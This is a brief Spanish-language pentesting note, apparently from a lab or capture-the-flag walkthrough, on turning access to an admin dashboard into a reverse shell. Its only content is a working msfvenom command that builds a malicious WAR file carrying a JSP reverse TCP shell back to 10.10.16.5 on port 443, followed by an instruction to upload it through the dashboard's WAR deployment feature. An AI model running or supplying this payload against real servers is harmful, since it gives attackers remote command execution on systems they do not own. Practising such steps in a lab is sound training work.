
### ADMIN DASHBOARD A REVSHELL
```shell
#CREAR UN ARCHIVO WAR MALICIOSO
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f war -o evil.war

Lo subimos a archivo war desplegar.
```